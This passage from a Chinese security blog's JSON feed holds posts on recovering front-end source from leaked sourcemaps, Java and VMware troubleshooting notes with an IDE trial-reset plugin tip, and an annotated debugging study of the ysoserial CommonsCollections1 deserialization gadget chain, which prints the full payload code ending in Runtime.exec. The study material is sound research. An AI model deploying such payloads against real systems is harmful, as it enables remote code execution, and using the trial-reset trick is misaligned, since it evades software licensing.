id=\"传送门\"><a class=\"markdownIt-Anchor\" href=\"#传送门\">#</a> 传送门</h1>\n<p><a href=\"https://www.cnblogs.com/loopkep/p/11135949.html\">https://www.cnblogs.com/loopkep/p/11135949.html</a></p>\n",
            "tags": [
                "redis,未授权,漏洞利用"
            ]
        },
        {
            "id": "http://example.com/2021/12/03/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/",
            "url": "http://example.com/2021/12/03/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/",
            "title": "sourcemap泄露获取前端源码",
            "date_published": "2021-12-03T03:20:41.000Z",
            "content_html": "<p>reverse-sourcemap 下载地址:<a href=\"https://github.com/davidkevork/reverse-sourcemap\">https://github.com/davidkevork/reverse-sourcemap</a></p>\n<ol>\n<li>\n<p>安装 nodejs</p>\n<p><code>apt install npm</code></p>\n</li>\n<li>\n<p>reverse-sourcemap</p>\n<p><code>npm install --global reverse-sourcemap</code></p>\n</li>\n<li>\n<p>使用.js.map 文件获取前端源码</p>\n<p><code> reverse-sourcemap -v xxx.js.map -o output</code></p>\n<p><img src=\"1.png\" alt=\"\"></p>\n</li>\n</ol>\n",
            "tags": [
                "前后端分离"
            ]
        },
        {
            "id": "http://example.com/2021/09/08/%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/",
            "url": "http://example.com/2021/09/08/%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/",
            "title": "问题及解决记录",
            "date_published": "2021-09-08T03:31:34.000Z",
            "content_html": "<h1 id=\"java\"><a class=\"markdownIt-Anchor\" href=\"#java\">#</a> Java</h1>\n<h2 id=\"debug调试报错\"><a class=\"markdownIt-Anchor\" href=\"#debug调试报错\">#</a> debug，调试报错</h2>\n<p>更换 jdk8 后无法 debug，可以 run</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\语言环境\\JDK8_32\\bin\\java.exe ...</span><br><span class=\"line\">FATAL ERROR in native method: JDWP No transports initialized, jvmtiError=AGENT_ERROR_TRANSPORT_LOAD(196)</span><br><span class=\"line\">Picked up JAVA_TOOL_OPTIONS: -Dfile.encoding=UTF-8</span><br><span class=\"line\">ERROR: transport library not found: dt_socket</span><br><span class=\"line\">ERROR: JDWP Transport dt_socket failed to initialize, TRANSPORT_LOAD(509)</span><br><span class=\"line\">JDWP exit error AGENT_ERROR_TRANSPORT_LOAD(196): No transports initialized [debugInit.c:750]</span><br><span class=\"line\"></span><br><span class=\"line\">Process finished with exit code 1</span><br></pre></td></tr></table></figure>\n<p>更换 idea 下载后的 jdk8 后解决问题，目测因为自己设置的 jdk 路径包含中文（out-of-ascii path）</p>\n<h2 id=\"idea重置插件\"><a class=\"markdownIt-Anchor\" href=\"#idea重置插件\">#</a> idea 重置插件</h2>\n<p>idea 无限重置方法</p>\n<ol>\n<li>\n<p>settings -&gt; plugins -&gt; 设置图标 -&gt; Manage Repositories，添加：<a href=\"https://plugins.zhile.io\">https://plugins.zhile.io</a></p>\n</li>\n<li>\n<p>在插件市场搜索 IDE eval reset</p>\n</li>\n</ol>\n<h1 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\">#</a> Linux</h1>\n<h2 id=\"虚拟机物理机互ping\"><a class=\"markdownIt-Anchor\" href=\"#虚拟机物理机互ping\">#</a> 虚拟机物理机互 ping</h2>\n<h3 id=\"nat模式物理机ping不通虚拟机\"><a class=\"markdownIt-Anchor\" href=\"#nat模式物理机ping不通虚拟机\">#</a> nat 模式物理机 ping 不通虚拟机</h3>\n<p><strong>虚拟机 ip：192.168.163.128</strong></p>\n<p><strong>物理机 ip：192.168.46.197</strong></p>\n<p>不在同一网段，更改虚拟机网卡配置为同一网段</p>\n<p>编辑 -&gt; 虚拟网络编辑器</p>\n<p><img src=\"1.png\" alt=\"\"></p>\n<p>然后 linux 下重启网卡 <code> systemctl restart networking</code></p>\n<p>获得<strong>虚拟机 ip：192.168.46.128</strong></p>\n<p>物理机还是 ping 不通的话，打开 <code> 控制面板\\网络和 Internet\\网络连接</code></p>\n<p>我 nat 模式对应 VMnet8 网卡，右击禁用后再启动</p>\n<p><img src=\"2.png\" alt=\"\"></p>\n<p>物理机 ping 通虚拟机</p>\n<p><img src=\"3.png\" alt=\"\"></p>\n<h3 id=\"nat模式虚拟机ping不通物理机\"><a class=\"markdownIt-Anchor\" href=\"#nat模式虚拟机ping不通物理机\">#</a> nat 模式虚拟机 ping 不通物理机</h3>\n<p><strong>虚拟机 ip：192.168.163.128</strong></p>\n<p><strong>物理机 ip：192.168.46.128</strong></p>\n<p>测试过不是防火墙的问题</p>\n<p><a href=\"http://xn--pingbaidu-927nn75bg59o.com\">可以 ping 通 baidu.com</a></p>\n<p>和物理机同一网段</p>\n<p><strong>物理机可 ping 通虚拟机</strong></p>\n<p>打开 编辑 -&gt; 虚拟网络编辑器，点击还原默认设置</p>\n<p><img src=\"4.png\" alt=\"\"></p>\n<p>此时发现虚拟机和物理机不是同一网段，但是可以互 ping</p>\n<p>物理机 ping 虚拟机：</p>\n<p><img src=\"5.png\" alt=\"\"></p>\n<p>虚拟机 ping 物理机：</p>\n<p><img src=\"6.png\" alt=\"\"></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/",
            "url": "http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/",
            "title": "ysoserial之CommonsCollections1调试",
            "date_published": "2021-09-07T02:12:48.000Z",
            "content_html": "<h1 id=\"利用链简述\"><a class=\"markdownIt-Anchor\" href=\"#利用链简述\">#</a> 利用链简述</h1>\n<ol>\n<li>任意方法执行</li>\n<li>高版本 java 已修复（Java 8u71 以后）</li>\n</ol>\n<h1 id=\"commonscollections1利用代码\"><a class=\"markdownIt-Anchor\" href=\"#commonscollections1利用代码\">#</a> CommonsCollections1 利用代码</h1>\n<p>项目地址：<a href=\"https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar\">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tGadget chain:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tObjectInputStream.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tAnnotationInvocationHandler.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tMap(Proxy).entrySet()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tAnnotationInvocationHandler.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\tLazyMap.get()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\tChainedTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tConstantTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tClass.getMethod()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.exec()</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tRequires:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcommons-collections</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@PayloadTest</span> ( precondition = <span class=\"string\">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CommonsCollections1</span> <span class=\"keyword\">extends</span> <span class=\"title\">PayloadRunner</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectPayload</span>&lt;<span class=\"title\">InvocationHandler</span>&gt; </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> InvocationHandler <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String command)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> String[] execArgs = <span class=\"keyword\">new</span> String[] &#123; command &#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">// inert chain for setup</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">\t\t<span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tString.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tObject.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map innerMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tReflections.setFieldValue(transformerChain, <span class=\"string\">&quot;iTransformers&quot;</span>, transformers); <span class=\"comment\">// arm with actual transformer chain</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> handler;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\tPayloadRunner.run(CommonsCollections1.class, args);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isApplicableJavaVersion</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"调试分析\"><a class=\"markdownIt-Anchor\" href=\"#调试分析\">#</a> 调试分析</h1>\n<p>ysoserialPOC 类中 getObject 方法一般是获取 payload 的方法</p>\n<h2 id=\"分析paylaod构造\"><a class=\"markdownIt-Anchor\" href=\"#分析paylaod构造\">#</a> 分析 paylaod 构造</h2>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> InvocationHandler <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String command)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">    \t<span class=\"comment\">// 传入的命令参数存储于execArgs数组中</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> String[] execArgs = <span class=\"keyword\">new</span> String[] &#123; command &#125;;</span><br><span class=\"line\">    \t<span class=\"comment\">// 开始构造transformerChain，用于执行命令</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// inert chain for setup</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 这一步据p神所言是为了隐藏日志中的进程日常信息， 加不加都会执行命令，只是异常信息不同</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">\t\t<span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 通过反射获得Runtime.exec(),并将命令参数execArgs传入</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tString.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tObject.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) </span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 修饰innerMap，将构造的transformerChain传入</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 当LayMap#get被调用时，会执行传入的transformerChain</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map innerMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">    \t<span class=\"comment\">// 将lazyMap传入AnnotationInvocationHandler</span></span><br><span class=\"line\">    \t<span class=\"comment\">// java代理sun.reflect.annotation.AnnotationInvocationHandler</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 获得代理对象时，会再传入一个handler（简称handler2），得到代理对象mapProxy，</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class=\"line\">\t\t<span class=\"comment\">// 将该代理对象包裹进入新的handler，简称handler1</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class=\"line\">\t\t<span class=\"comment\">// 最后将构造好的命令执行transformers传入transformerChain</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 最后放是为了防止在构造payload时弹出计算器</span></span><br><span class=\"line\">\t\tReflections.setFieldValue(transformerChain, <span class=\"string\">&quot;iTransformers&quot;</span>, transformers); <span class=\"comment\">// arm with actual transformer chain</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// 最后包装好的handler即为我们的payload</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> handler;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"知识点\"><a class=\"markdownIt-Anchor\" href=\"#知识点\">#</a> 知识点</h3>\n<p>需要理解的知识点主要有两部分：transform 和 proxy</p>\n<p>想要深究的话可以去看详细解释，以下只记录此处用到的点</p>\n<p>我看代理的时候是参考的这篇文章：<a href=\"https://xie.infoq.cn/article/9a9387805a496e1485dc8430f\">https://xie.infoq.cn/article/9a9387805a496e1485dc8430f</a></p>\n<h4 id=\"先来看看trasnform\"><a class=\"markdownIt-Anchor\" href=\"#先来看看trasnform\">#</a> 先来看看 trasnform</h4>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">    <span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\"><span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">        String.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">        Object.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">        <span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br></pre></td></tr></table></figure>\n<p><strong>ConstantTransformer</strong></p>\n<p>构造方法传入一个类</p>\n<p>通过该类的 transform 方法获取一个对象类型，如 transform 参数是 Runtime.class 时，调用 ConstantTransformer 类的 transform 方法，执行后返回 java.lang.Runtime 类</p>\n<p><strong>InvokerTransformer</strong></p>\n<p>构造方法 InvokerTransformer (String methodName, Class [] paramTypes, Object [] args)</p>\n<p>第一个参数为方法名，第二个参数为方法参数类型数组，第三个参数为方法参数数组</p>\n<p>该类的 transform 通过反射执行函数</p>\n<p>例如下面的代码，transform 传入 Runtime 对象，通过反射执行 exec 函数，传入命令为 calc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">InvokerTransformer invokerTransformer = <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;,<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;);</span><br><span class=\"line\">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>\n<p><strong>transformerChain</strong></p>\n<p>transformers 的链，构造方法传入一个 transform 数组</p>\n<p>串起来了很多 transformer</p>\n<p>为什么是串起来的呢，见下图</p>\n<p><img src=\"62.png\" alt=\"\"></p>\n<p>其中前面一个 transform 输出的结果会作为参数传入后一个 transform</p>\n<p>那么此处代码就可以很好的解释啦</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 通过反射获取Runtime，因为Class类实现了Serializable接口</span></span><br><span class=\"line\"><span class=\"comment\">//        Method f = Runtime.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">//        Runtime r = (Runtime) f.invoke(null);</span></span><br><span class=\"line\"><span class=\"comment\">//        r.exec(&quot;C:\\\\WINDOWS\\\\system32\\\\calc.exe&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">    <span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 返回java.lang.Runtime类</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),  </span><br><span class=\"line\">        <span class=\"comment\">//传入上面transform得到的Runtime类（Class对象），调用getMethod方法，传入调用getMethod方法方法参数为getRuntime；也就是获取该类的getRuntime方法</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123; </span><br><span class=\"line\">            String.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">        <span class=\"comment\">// 传入上面transform得到的getRuntime方法（Method对象），调用invoke方法，传入invoke方法的参数为Object[]，其实就是按照参数列表传就好了，因为此处只需要调用invoke方法获得Runtime对象</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">            Object.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">            <span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">        <span class=\"comment\">// 传入上面transform得到的Runtime对象，调用exec方法，传入该方法的参数为execArgs</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">            <span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">        <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"最后康康proxy\"><a 